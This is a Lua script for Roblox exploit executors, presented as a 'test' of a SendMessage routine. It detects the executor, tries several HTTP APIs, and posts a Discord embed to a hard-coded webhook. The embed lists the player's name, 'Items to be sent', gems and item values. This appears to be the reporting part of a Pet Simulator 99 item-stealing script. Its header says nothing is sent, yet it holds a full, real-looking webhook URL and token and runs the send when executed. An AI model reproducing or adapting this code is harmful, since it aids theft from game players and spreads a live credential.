-- test_sendmessage.lua
-- Test version of your SendMessage function using fake values and safe detection.
-- Nothing will be sent unless you replace WEBHOOK with a real webhook URL.

local HttpService = game:GetService("HttpService")

-- ======= Fake/test data (replace only for real tests) =======
local WEBHOOK = "https://discord.com/api/webhooks/1407814443231871226/doFyO0sPxeH5WFjvWgW0UlKDgjG6xAuBAvXjBAffh88jLaccLjOpsg32cKqBAp1y8iWq" -- placeholder (do NOT use a real webhook here)
local plr = { Name = "TestPlayer" }
local totalRAP = 123456

-- sample sortedItems structure (name, amount, rap)
local sortedItems = {
    { name = "Cool Sword", amount = 2, rap = 1500 },
    { name = "Epic Hat", amount = 1, rap = 4200 },
    { name = "Common Pet", amount = 10, rap = 50 },
}

local function formatNumber(n)
    -- simple thousands separator for display
    local s = tostring(n)
    local k
    while true do
        s, k = string.gsub(s, "^(-?%d+)(%d%d%d)", '%1,%2')
        if k == 0 then break end
    end
    return s
end

-- ======= Executor detection (conservative) =======
local function detectExecutor()
    local name = "Unknown"
    local hints = {}

    if type(identifyexecutor) == "function" then
        local ok, res = pcall(identifyexecutor)
        if ok and type(res) == "string" and #res > 0 then
            name = res
            table.insert(hints, "identifyexecutor() -> " .. res)
            return name, hints
        end
    end

    if type(getexecutor) == "function" then
        local ok, res = pcall(getexecutor)
        if ok and type(res) == "string" and #res > 0 then
            name = res
            table.insert(hints, "getexecutor() -> " .. res)
            return name, hints
        end
    end

    if type(syn) == "table" then
        name = "Synapse"
        table.insert(hints, "syn table present")
    elseif rawget(_G, "KRNL_LOADED") then
        name = "Krnl"
        table.insert(hints, "KRNL_LOADED present")
    elseif rawget(_G, "is_sirhurt_closure") or rawget(_G, "ispresent") then
        name = "SirHurt/Similar"
        table.insert(hints, "sirhurt-ish globals")
    end

    return name, hints
end

-- ======= Requester chooser =======
local function makeRequester()
    -- Normalizer for opts
    local function normalize(opts)
        if type(opts) == "string" then
            return { Url = opts, Method = "GET" }
        end
        opts = opts or {}
        return {
            Url = opts.Url,
            Method = (opts.Method and tostring(opts.Method)) or "GET",
            Headers = opts.Headers or {},
            Body = opts.Body,
        }
    end

    local function try_syn(opts)
        if type(syn) == "table" and type(syn.request) == "function" then
            local ok, res = pcall(function() return syn.request(opts) end)
            if ok then return true, res, "syn.request" end
        end
        return false
    end

    local function try_http(opts)
        if type(http_request) == "function" then
            local ok, res = pcall(function() return http_request(opts) end)
            if ok then return true, res, "http_request" end
        end
        if type(http) == "table" and type(http.request) == "function" then
            local ok, res = pcall(function() return http.request(opts) end)
            if ok then return true, res, "http.request" end
        end
        return false
    end

    local function try_request(opts)
        if type(request) == "function" then
            local ok, res = pcall(function() return request(opts) end)
            if ok then return true, res, "request" end
        end
        return false
    end

    local function try_httpservice(opts)
        if HttpService and type(HttpService.RequestAsync) == "function" then
            local ok, res = pcall(function()
                return HttpService:RequestAsync({
                    Url = opts.Url,
                    Method = opts.Method or "GET",
                    Headers = opts.Headers,
                    Body = opts.Body,
                })
            end)
            if ok then return true, res, "HttpService:RequestAsync" end
        end
        return false
    end

    return function(raw)
        local opts = normalize(raw)
        local ok, res, used

        ok, res, used = try_syn(opts)
        if ok then return true, res, used end

        ok, res, used = try_http(opts)
        if ok then return true, res, used end

        ok, res, used = try_request(opts)
        if ok then return true, res, used end

        ok, res, used = try_httpservice(opts)
        if ok then return true, res, used end

        return false, { message = "No supported HTTP API found" }, nil
    end
end

-- ======= Test SendMessage (uses fake values) =======
local function TestSendMessage(diamonds)
    -- Build header & fields like your original
    local headers = { ["Content-Type"] = "application/json" }
    local fields = {
        { name = "Username:", value = plr.Name, inline = true },
        { name = "Items to be sent:", value = "", inline = false },
        { name = "Summary:", value = "", inline = false },
    }

    -- combine items
    local combined = {}
    local itemRapMap = {}
    for _, item in ipairs(sortedItems) do
        local key = item.name
        if itemRapMap[key] then
            itemRapMap[key].amount = itemRapMap[key].amount + item.amount
        else
            itemRapMap[key] = { amount = item.amount, rap = item.rap }
            table.insert(combined, key)
        end
    end

    table.sort(combined, function(a,b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount
    end)

    for _, name in ipairs(combined) do
        local d = itemRapMap[name]
        fields[2].value = fields[2].value .. name .. " (x" .. d.amount .. "): " .. formatNumber(d.rap * d.amount) .. " RAP\n"
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))

    -- limit length
    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    -- Executor + requester
    local executorName, hints = detectExecutor()
    local doRequest = makeRequester()

    -- append executor field
    table.insert(fields, { name = "Executor", value = executorName .. (hints[1] and (" â€” " .. hints[1]) or ""), inline = true })

    local payload = {
        embeds = {{
            title = "\240\159\144\177 New PS99 Execution (TEST)",
            color = 5439232,
            fields = fields,
            footer = { text = "NULS | test payload" }
        }}
    }

    local body = HttpService:JSONEncode(payload)
    local ok, res, used = doRequest({
        Url = WEBHOOK,
        Method = "POST",
        Headers = headers,
        Body = body
    })

    print("=== TestSendMessage Debug ===")
    print("Executor detected:", executorName)
    print("Request API used:", used)
    if not ok then
        print("Request failed:", res and (res.message or tostring(res)) or "unknown error")
        return false, res
    end

    -- normalize response (best-effort)
    if type(res) == "table" then
        local status = res.StatusCode or res.status or res.code or res.Status
        local bodyText = res.Body or res.body or nil
        print("Response status:", status)
        if bodyText then
            print("Response body (snippet):", (tostring(bodyText):sub(1,300)))
        else
            print("Response table returned (no body field); dumping keys:")
            for k,v in pairs(res) do print(" ", k, tostring(v)) end
        end
    else
        print("Response (raw):", tostring(res))
    end

    print("=== end debug ===")
    return true, res
end

-- Run the test with a fake diamonds value
TestSendMessage(999)
